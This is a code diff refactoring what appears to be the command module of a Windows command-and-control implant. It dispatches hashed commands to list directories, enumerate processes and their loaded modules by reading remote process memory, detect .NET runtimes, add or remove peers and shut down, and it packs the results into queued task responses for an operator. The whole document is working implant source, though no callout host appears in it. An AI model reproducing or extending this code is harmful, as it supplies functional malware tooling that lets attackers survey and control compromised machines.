@@ -7,60 +7,64 @@ using namespace Dispatcher;
 namespace Commands {
 
     RDATA HASH_MAP cmd_map[] = {
-        { .name = DIRECTORYLIST, 	.address = DirectoryList  },
-        { .name = PROCESSMODULES,	.address = ProcessModules },
-        { .name = PROCESSLIST,		.address = ProcessList    },
-        { .name = ADDPEER,			.address = AddPeer        },
-        { .name = REMOVEPEER,		.address = RemovePeer     },
-        { .name = SHUTDOWN,			.address = Shutdown       },
-        { .name = 0,				.address = nullptr					}
+        { .name = DIRECTORYLIST, 	.address = DirectoryList        },
+        { .name = PROCESSMODULES,	.address = ProcessModules       },
+        { .name = PROCESSLIST,		.address = ProcessList          },
+        { .name = ADDPEER,			.address = CommandAddPeer       },
+        { .name = REMOVEPEER,		.address = CommandRemovePeer    },
+        { .name = SHUTDOWN,			.address = Shutdown             },
+        { .name = 0,				.address = nullptr		        },
     };
 
     VOID DirectoryList (_parser *const parser) {
 
         _stream *out = CreateTaskResponse(DIRECTORYLIST);
 
-        ULONG length    = 0;
-        LPSTR query     = nullptr;
-        LPSTR path      = nullptr;
+        ULONG size      = 0;
         HANDLE handle   = nullptr;
 
         WIN32_FIND_DATAA head       = { };
-        ULARGE_INTEGER handle_size  = { };
+        ULARGE_INTEGER file_size    = { };
         SYSTEMTIME access_time      = { };
         SYSTEMTIME sys_time         = { };
 
-        query   = UnpackString(parser, nullptr);
-        path    = (char*) Malloc(MAX_PATH);
+        const auto dir_string     = UnpackString(parser, nullptr);
+        const auto path_buffer    = (char*) Malloc(MAX_PATH);
 
-        if (query[0] == PERIOD) {
-            x_assert(length = Ctx->win32.GetCurrentDirectoryA(MAX_PATH, path));
-
-            if (path[length - 1] != BSLASH) {
-                path[length++] = BSLASH;
+        if (dir_string[0] == PERIOD) {
+            if (!(size = Ctx->win32.GetCurrentDirectoryA(MAX_PATH, path_buffer))) {
+                // LOG ERROR
+                goto defer;
             }
 
-            path[length++]  = ASTER;
-            path[length]    = NULTERM;
+            if (path_buffer[size - 1] != BSLASH) {
+                path_buffer[size++] = BSLASH;
+            }
+
+            path_buffer[size++]  = ASTER;
+            path_buffer[size]    = NULTERM;
         }
         else {
-            MemCopy(path, query, MAX_PATH);
+            MemCopy(path_buffer, dir_string, MAX_PATH);
         }
 
-        if ((handle = Ctx->win32.FindFirstFileA(path, &head))) {
+        if ((handle = Ctx->win32.FindFirstFileA(path_buffer, &head))) {
             do {
-                x_assert(Ctx->win32.FileTimeToSystemTime(&head.ftLastAccessTime, &access_time));
-                x_assert(Ctx->win32.SystemTimeToTzSpecificLocalTime(nullptr, &access_time, &sys_time));
+                if (!Ctx->win32.FileTimeToSystemTime(&head.ftLastAccessTime, &access_time) ||
+                    !Ctx->win32.SystemTimeToTzSpecificLocalTime(nullptr, &access_time, &sys_time)) {
+                    // LOG ERROR
+                    goto defer;
+                }
 
                 if (head.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                     PackUint32(out, TRUE);
                 }
                 else {
-                    handle_size.HighPart   = head.nFileSizeHigh;
-                    handle_size.LowPart    = head.nFileSizeLow;
+                    file_size.HighPart   = head.nFileSizeHigh;
+                    file_size.LowPart    = head.nFileSizeLow;
 
                     PackUint32(out, FALSE);
-                    PackUint64(out, handle_size.QuadPart);
+                    PackUint64(out, file_size.QuadPart);
                 }
 
                 PackUint32(out, access_time.wMonth);
@@ -74,17 +78,18 @@ namespace Commands {
             while (Ctx->win32.FindNextFileA(handle, &head) != 0);
         }
         else {
+            // LOG ERROR
             goto defer;
         }
 
         MessageQueue(out);
 
-        defer:
+    defer:
         if (handle) {
             Ctx->win32.FindClose(handle);
         }
-        if (path) {
-            Free(path);
+        if (path_buffer) {
+            Free(path_buffer);
         }
     }
 
@@ -111,13 +116,12 @@ namespace Commands {
         x_ntassert(Process::NtOpenProcess(&process, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, pid));
 
         x_ntassert(Ctx->nt.NtQueryInformationProcess(process, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), nullptr));
-        x_ntassert(Ctx->nt.NtReadVirtualMemory(process, &pbi.PebBaseAddress->Ldr, &loads, sizeof(LDR_DATA_TABLE_ENTRY*), &size));
+        x_ntassert(Ctx->nt.NtReadVirtualMemory(process, &pbi.PebBaseAddress->Ldr, &loads, sizeof(PLDR_DATA_TABLE_ENTRY), &size));
         x_ntassert(Ctx->nt.NtReadVirtualMemory(process, &loads->InMemoryOrderModuleList.Flink, &entry, sizeof(PLIST_ENTRY), nullptr));
 
         for (head = &loads->InMemoryOrderModuleList; entry != head; entry = module.InMemoryOrderLinks.Flink) {
             x_ntassert(Ctx->nt.NtReadVirtualMemory(process, CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks), &module, sizeof(LDR_DATA_TABLE_ENTRY), nullptr));
             x_ntassert(Ctx->nt.NtReadVirtualMemory(process, module.FullDllName.Buffer, &modname_w, module.FullDllName.Length, &size));
-
             x_assert(size == module.FullDllName.Length);
 
             if (module.FullDllName.Length > 0) {
@@ -136,19 +140,20 @@ namespace Commands {
         defer:
     }
 
-    VOID ProcessList(_parser *const parser) {
+    VOID ProcessList() {
 
         _stream *out = CreateTaskResponse(PROCESSLIST);
 
-        PROCESSENTRY32 entries      = { };
-        HANDLE snapshot             = { };
-        HANDLE process              = { };
+        PROCESSENTRY32 entries = { };
 
-        IEnumUnknown *enums         = { };
-        ICLRMetaHost *meta          = { };
-        ICLRRuntimeInfo *runtime    = { };
+        HANDLE snapshot             = nullptr;
+        HANDLE process              = nullptr;
 
-        WCHAR buffer[1024];
+        IEnumUnknown *enums         = nullptr;
+        ICLRMetaHost *meta          = nullptr;
+        ICLRRuntimeInfo *runtime    = nullptr;
+
+        WCHAR buffer[1024] = { };
         DWORD size = 0;
 
         size            = ARRAY_LEN(buffer);
@@ -158,15 +163,14 @@ namespace Commands {
         x_assert(Ctx->win32.Process32First(snapshot, &entries));
 
         do {
-            CLIENT_ID cid = { };
-            OBJECT_ATTRIBUTES attr = { };
-
+            CLIENT_ID cid       = { };
             cid.UniqueThread    = nullptr;
             cid.UniqueProcess   = (void*) entries.th32ProcessID;
 
             BOOL is_managed  = false;
             BOOL is_loaded   = false;
 
+            OBJECT_ATTRIBUTES attr = { };
             InitializeObjectAttributes(&attr, nullptr, 0, nullptr, nullptr);
 
             x_ntassert(Ctx->nt.NtOpenProcess(&process, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, &attr, &cid));
@@ -189,7 +193,7 @@ namespace Commands {
             if (!is_managed) {
                 PackUint32(out, entries.th32ProcessID);
                 PackString(out, entries.szExeFile);
-                PackWString(out, 0);
+                PackWString(out, nullptr);
             }
 
             if (process) {
@@ -238,21 +242,16 @@ namespace Commands {
     }
 
 
-    UINT_PTR GetCommandAddress(const uint32_t name) {
-
-        uintptr_t address = { };
+    UINT_PTR GetCommandAddress(const uint32_t name_id) {
 
         for (uint32_t i = 0 ;; i++) {
             if (!cmd_map[i].name) {
-                return_defer(ERROR_PROC_NOT_FOUND);
+                return 0;
             }
 
-            if (cmd_map[i].name == name) {
-                address = U_PTR(cmd_map[i].address);
+            if (cmd_map[i].name == name_id) {
+                return U_PTR(cmd_map[i].address);
             }
         }
-
-        defer:
-        return address;
     }
 }
